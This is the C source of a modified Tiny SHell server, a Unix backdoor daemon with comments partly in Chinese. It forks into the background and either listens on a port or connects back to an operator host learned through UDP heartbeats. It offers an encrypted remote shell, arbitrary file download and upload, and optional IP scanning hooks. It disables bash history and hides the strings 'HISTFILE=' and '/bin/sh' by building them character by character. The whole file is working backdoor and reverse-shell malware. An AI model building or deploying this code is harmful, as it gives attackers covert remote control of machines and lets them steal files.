/*
 * Tiny SHell version 0.6 - server side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <netdb.h>

/* PTY support requires system-specific #include */

#if defined LINUX || defined OSF
  #include <pty.h>
#else
#if defined FREEBSD
  #include <libutil.h>
#else
#if defined OPENBSD
  #include <util.h>
#else
#if defined SUNOS || defined HPUX
  #include <sys/stropts.h>
#else
#if ! defined CYGWIN && ! defined IRIX
  #error Undefined host system
#endif
#endif
#endif
#endif
#endif

#include "tsh.h"
#include "pel.h"
#include "tshUdpProxy.h"

unsigned char message[BUFSIZE + 1];
extern char *optarg;
extern int optind;

/* function declaration */

int process_client( int client );
int tshd_get_file( int client );
int tshd_put_file( int client );
int tshd_runshell( int client );

void usage(char *argv0)
{
    DLOG_ERR("Usage: %s [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]\n", argv0);
    DLOG_ERR("Usage: %s [ -f [ forgound, backgound as default ]\n", argv0);
    exit(1);
}

bool hasWaitConnectSignal(int udpSock, struct sockaddr_in *udpAddr, struct sockaddr_in *outServer) {
	static time_t lastHeartBeatTime;

	if (time(NULL) - lastHeartBeatTime > MAX_UDP_HEARTBEAT) {
		const char *pdata = NULL;
		struct tshProtocol data;
		data.magic = MAGIC;
		data.type = UPD_HEADBEAT;
		data.length = TSH_PROT_HEADER_LEN;
		
#ifdef SCAN_IP
		extern const char * getPayloadData();
		pdata = getPayloadData();
#endif
		if (pdata) {
			data.type |= UPD_PAYLOAD_DATA;
			data.length += strlen(pdata);
		}
		DLOG_INFO("udp send heart beat data to %s " IPBLabel "\n", cb_host, IPBValue(*udpAddr));
		udpSendPacketData(udpSock, udpAddr, &data, pdata);
		lastHeartBeatTime = time(NULL);
	}
	// 返回0表示有等待的连接请求

	struct tshProtocol recvdata;

	char payloadBuf[MAX_PAYLOAD_LEN];
	struct sockaddr_in udpSrvAddr;
	if (!udpRecvPacketData(udpSock, &recvdata, &udpSrvAddr, payloadBuf, MAX_PAYLOAD_LEN)) {
		return false;
	}

	if (recvdata.type == UPD_PAYLOAD_DATA) {
		DLOG_INFO("udp recv heartbeat from type : 0x%08x, len : %d, " IPBLabel "\n",
			 recvdata.type,
			 recvdata.length,
			 IPBValue(udpSrvAddr));
#ifdef SCAN_IP
		extern void handlePayloadData(const char *);
		handlePayloadData(payloadBuf);
#endif
		return false;
	} else if (recvdata.type == UPD_BACK_CONNECT) {
		DLOG_INFO("udp recv from type : 0x%08x, len : %d, [%d.%d.%d.%d:%d]\n",
			 recvdata.type,
			 recvdata.length,
			 __IP3(recvdata.listen_ip), __IP2(recvdata.listen_ip),
			 __IP1(recvdata.listen_ip), __IP0(recvdata.listen_ip),
			 __PORT(recvdata.listen_port));

		memset((void *)outServer, '\0', (size_t)sizeof(struct sockaddr_in));
		outServer->sin_family = AF_INET;
		outServer->sin_addr.s_addr = recvdata.listen_ip;
		outServer->sin_port = recvdata.listen_port;
		if (outServer->sin_addr.s_addr == 0) {
			outServer->sin_addr.s_addr = udpAddr->sin_addr.s_addr;
		}
		return true;
	}

	return false;
}

/* program entry point */


int main( int argc, char **argv )
{
    int ret, pid;
    socklen_t n;
    int opt;

    int client, server;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    struct hostent *client_host;
	/* background as default. */
	int background = 1;
	/* use Udp proxy to got tcp ip:port, not tcp direct. */
	int proxyUdp = 1;

#ifdef CB_HOST_DNS
	cb_host = CB_HOST_DNS;
#endif
	DLOG_INIT(NULL, NULL);

	while ((opt = getopt(argc, argv, "s:p:c:l:fdv")) != -1) {
        switch (opt) {
            case 'p':
                server_port=atoi(optarg); /* We hope ... */
                if (!server_port) usage(*argv);
                break;
            case 's':
                secret=optarg; /* We hope ... */
                break;
            case 'f':
                background = 0;
				DLOG_CONSOLE(stdout);
                break;
			case 'd':
				proxyUdp = 0;
				break;
			case 'l':
				DLOG_FILE(optarg);
				break;
			case 'c':
				if (optarg == NULL) {
					cb_host = CONNECT_BACK_HOST;
				} else {
					cb_host = optarg;
				}
				break;
			case 'v':
				DLOG_LEVEL(DLOG_LEVEL_VERBOSE);
				break;
            default: /* '?' */
                usage(*argv);
                break;
        }
    }

    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    /* fork into background */
	if (background) {
		pid = fork();

		if( pid < 0 )
		{
			return( 1 );
		}

		if( pid != 0 )
		{
			return( 0 );
		}

		/* create a new session */

		if( setsid() < 0 )
		{
			perror("socket");
			return( 2 );
		}

		// BUGFIX don't close the fs, because remote tsh will require password once close fd.
		/* close all file descriptors */
		/*
		for( n = 0; n < 1024; n++ )
		{
			close( n );
		}
		*/
	}

#ifdef SCAN_IP
	// create pthread after fork.
	extern int ipscan_main(int argc, char *argv[]);
	ipscan_main(argc, argv);
#endif

	if (cb_host == NULL) {
    	/* create a socket */

	    server = socket( AF_INET, SOCK_STREAM, 0 );

	    if( server < 0 )
	    {
	        perror("socket");
	        return( 3 );
	    }

	    /* bind the server on the port the client will connect to */    

	    n = 1;

	    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
                      (void *) &n, sizeof( n ) );

	    if( ret < 0 )
	    {
	        perror("setsockopt");
	        return( 4 );
	    }

	    server_addr.sin_family      = AF_INET;
	    server_addr.sin_port        = htons( server_port );
	    server_addr.sin_addr.s_addr = INADDR_ANY;

	    ret = bind( server, (struct sockaddr *) &server_addr,
                sizeof( server_addr ) );

	    if( ret < 0 )
	    {
	        perror("bind");
	        return( 5 );
	    }

	    if( listen( server, 5 ) < 0 )
	    {
	        perror("listen");
	        return( 6 );
	    }

	    while( 1 )
	    {
    	    /* wait for inboud connections */

        	n = sizeof( client_addr );

	        client = accept( server, (struct sockaddr *)
                         &client_addr, &n );

    	    if( client < 0 )
        	{
            	perror("accept");
	            return( 7 );
	        }

			ret = process_client(client);

			if (ret == 1) {
				continue;
			}

	        return( ret );
		}
	} else {
		/* -c specfieid, connect back mode */

		int udpServer = socket(AF_INET, SOCK_DGRAM, 0);
		struct timeval tv;
		tv.tv_sec = 1 * 60;
		tv.tv_usec = 0;
		setsockopt(udpServer, SOL_SOCKET, SO_RCVTIMEO, (const void *)&tv, (socklen_t)sizeof(tv));

		struct sockaddr_in udpAddr = true_parseHostAndPort(cb_host, UDP_ProxyPort);
	    while( 1 )
	    {
			struct sockaddr_in sServer;
			if (proxyUdp) {
				if (udpAddr.sin_family == AF_UNSPEC || udpAddr.sin_addr.s_addr == 0 || udpAddr.sin_port == 0) {
					udpAddr = true_parseHostAndPort(cb_host, UDP_ProxyPort);
				}
				/* 如果UDP发送过来了反向连接的ip:port */
				if(!hasWaitConnectSignal(udpServer, &udpAddr, &sServer)) {
					// 如果没有反向连接数据.
					continue;
				}
				DLOG_INFO("udp got tcp addr " IPBLabel " and begin to connect\n", IPBValue(sServer));
			} else {
				sleep( CONNECT_BACK_DELAY );
			}

	        /* create a socket */

	        client = socket( AF_INET, SOCK_STREAM, 0 );

	        if( client < 0 )
	        {
	            continue;
	        }

	        /* resolve the client hostname */

#if 0
	        client_host = gethostbyname( cb_host );

	        if( client_host == NULL )
	        {
	            continue;
	        }

	        memcpy( (void *) &client_addr.sin_addr,
	                (void *) client_host->h_addr,
	                client_host->h_length );

	        client_addr.sin_family = AF_INET;
	        client_addr.sin_port   = htons( server_port );
#endif
			if (proxyUdp) {
				/* 使用从UDP监听来的地址 */
				client_addr = sServer;
			}
	        /* try to connect back to the client */

	        ret = connect( client, (struct sockaddr *) &client_addr,
	                       sizeof( client_addr ) );

	        if( ret < 0 )
	        {
	            close( client );
	            continue;
	        }

	        ret = process_client(client);
			if (ret == 1) {
				continue;
			}

			return( ret );
	    }
	}

    /* not reached */

    return( 13 );
}

int process_client(int client) {

	int pid, ret, len;

    /* fork a child to handle the connection */

    pid = fork();

    if( pid < 0 )
    {
        close( client );
        return 1;
    }

    if( pid != 0 )
    {
        waitpid( pid, NULL, 0 );
        close( client );
    	return 1;
    }

    /* the child forks and then exits so that the grand-child's
     * father becomes init (this to avoid becoming a zombie) */

    pid = fork();

    if( pid < 0 )
    {
        return( 8 );
    }

    if( pid != 0 )
    {
    	return( 9 );
    }

    /* setup the packet encryption layer */

    alarm( 3 );

    ret = pel_server_init( client, secret );

    if( ret != PEL_SUCCESS )
    {
		shutdown( client, 2 );
    	return( 10 );
    }

    alarm( 0 );

    /* get the action requested by the client */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS || len != 1 )
    {
        shutdown( client, 2 );
        return( 11 );
    }

    /* howdy */

	switch( message[0] )
    {
        case GET_FILE:

            ret = tshd_get_file( client );
            break;

        case PUT_FILE:

            ret = tshd_put_file( client );
            break;

        case RUNSHELL:

			ret = tshd_runshell( client );
			break;

        default:
                
        	ret = 12;
	    	break;
    }

    shutdown( client, 2 );
	return( ret );
}

int tshd_get_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 14 );
    }

    message[len] = '\0';

    /* open local file */

    fd = open( (char *) message, O_RDONLY );

    if( fd < 0 )
    {
        return( 15 );
    }

    /* send the data */

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len == 0 ) break;

        if( len < 0 )
        {
            return( 16 );
        }

        ret = pel_send_msg( client, message, len );

        if( ret != PEL_SUCCESS )
        {
            return( 17 );
        }
    }

    return( 18 );
}

int tshd_put_file( int client )
{
    int ret, len, fd;

    /* get the filename */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 19 );
    }

    message[len] = '\0';

    /* create local file */

    fd = creat( (char *) message, 0644 );

    if( fd < 0 )
    {
        return( 20 );
    }

    /* fetch the data */

    while( 1 )
    {
        ret = pel_recv_msg( client, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED )
            {
                break;
            }

            return( 21 );
        }

        if( write( fd, message, len ) != len )
        {
            return( 22 );
        }
    }

    return( 23 );
}

int tshd_runshell( int client )
{
    fd_set rd;
    struct winsize ws;
    char *slave, *temp, *shell;
    int ret, len, pid, pty, tty, n;

    /* request a pseudo-terminal */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

    if( openpty( &pty, &tty, NULL, NULL, NULL ) < 0 )
    {
        return( 24 );
    }

    slave = ttyname( tty );

    if( slave == NULL )
    {
        return( 25 );
    }

#else
#if defined IRIX

    slave = _getpty( &pty, O_RDWR, 0622, 0 );

    if( slave == NULL )
    {
        return( 26 );
    }

    tty = open( slave, O_RDWR | O_NOCTTY );

    if( tty < 0 )
    {
        return( 27 );
    }

#else
#if defined CYGWIN || defined SUNOS || defined HPUX

    pty = open( "/dev/ptmx", O_RDWR | O_NOCTTY );

    if( pty < 0 )
    {
        return( 28 );
    }

    if( grantpt( pty ) < 0 )
    {
        return( 29 );
    }

    if( unlockpt( pty ) < 0 )
    {
        return( 30 );
    }

    slave = ptsname( pty );

    if( slave == NULL )
    {
        return( 31 );
    }

    tty = open( slave, O_RDWR | O_NOCTTY );

    if( tty < 0 )
    {
        return( 32 );
    }

#if defined SUNOS || defined HPUX

    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
    {
        return( 33 );
    }

    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
    {
        return( 34 );
    }

#if defined SUNOS

    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
    {
        return( 35 );
    }

#endif
#endif
#endif
#endif
#endif

    /* just in case bash is run, kill the history file */

    temp = (char *) malloc( 10 );

    if( temp == NULL )
    {
        return( 36 );
    }

    temp[0] = 'H'; temp[5] = 'I';
    temp[1] = 'I'; temp[6] = 'L';
    temp[2] = 'S'; temp[7] = 'E';
    temp[3] = 'T'; temp[8] = '=';
    temp[4] = 'F'; temp[9] = '\0';

    putenv( temp );

    /* get the TERM environment variable */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 37 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 6 );

    if( temp == NULL )
    {
        return( 38 );
    }

    temp[0] = 'T'; temp[3] = 'M';
    temp[1] = 'E'; temp[4] = '=';
    temp[2] = 'R';

    strncpy( temp + 5, (char *) message, len + 1 );

    putenv( temp );

    /* get the window size */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS || len != 4 )
    {
        return( 39 );
    }

    ws.ws_row = ( (int) message[0] << 8 ) + (int) message[1];
    ws.ws_col = ( (int) message[2] << 8 ) + (int) message[3];

    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    if( ioctl( pty, TIOCSWINSZ, &ws ) < 0 )
    {
        return( 40 );
    }

    /* get the system command */

    ret = pel_recv_msg( client, message, &len );

    if( ret != PEL_SUCCESS )
    {
        return( 41 );
    }

    message[len] = '\0';

    temp = (char *) malloc( len + 1 );

    if( temp == NULL )
    {
        return( 42 );
    }

    strncpy( temp, (char *) message, len + 1 );

    /* fork to spawn a shell */

    pid = fork();

    if( pid < 0 )
    {
        return( 43 );
    }

    if( pid == 0 )
    {
        /* close the client socket and the pty (master side) */

        close( client );
        close( pty );

        /* create a new session */

        if( setsid() < 0 )
        {
            return( 44 );
        }

        /* set controlling tty, to have job control */

#if defined LINUX || defined FREEBSD || defined OPENBSD || defined OSF

        if( ioctl( tty, TIOCSCTTY, NULL ) < 0 )
        {
            return( 45 );
        }

#else
#if defined CYGWIN || defined SUNOS || defined IRIX || defined HPUX

        {
            int fd;

            fd = open( slave, O_RDWR );

            if( fd < 0 )
            {
                return( 46 );
            }

            close( tty );

            tty = fd;
        }

#endif
#endif

        /* tty becomes stdin, stdout, stderr */

        dup2( tty, 0 );
        dup2( tty, 1 );
        dup2( tty, 2 );

        if( tty > 2 )
        {
            close( tty );
        }

        /* fire up the shell */

        shell = (char *) malloc( 8 );

        if( shell == NULL )
        {
            return( 47 );
        }

        shell[0] = '/'; shell[4] = '/';
        shell[1] = 'b'; shell[5] = 's';
        shell[2] = 'i'; shell[6] = 'h';
        shell[3] = 'n'; shell[7] = '\0';

        execl( shell, shell + 5, "-c", temp, (char *) 0 );

        /* d0h, this shouldn't happen */

        return( 48 );
    }
    else
    {
        /* tty (slave side) not needed anymore */

        close( tty );

        /* let's forward the data back and forth */

        while( 1 )
        {
            FD_ZERO( &rd );
            FD_SET( client, &rd );
            FD_SET( pty, &rd );

            n = ( pty > client ) ? pty : client;

            if( select( n + 1, &rd, NULL, NULL, NULL ) < 0 )
            {
                return( 49 );
            }

            if( FD_ISSET( client, &rd ) )
            {
                ret = pel_recv_msg( client, message, &len );

                if( ret != PEL_SUCCESS )
                {
                    return( 50 );
                }

                if( write( pty, message, len ) != len )
                {
                    return( 51 );
                }
            }

            if( FD_ISSET( pty, &rd ) )
            {
                len = read( pty, message, BUFSIZE );

                if( len == 0 ) break;

                if( len < 0 )
                {
                    return( 52 );
                }

                ret = pel_send_msg( client, message, len );

                if( ret != PEL_SUCCESS )
                {
                    return( 53 );
                }
            }
        }

        return( 54 );
    }

    /* not reached */

    return( 55 );
}
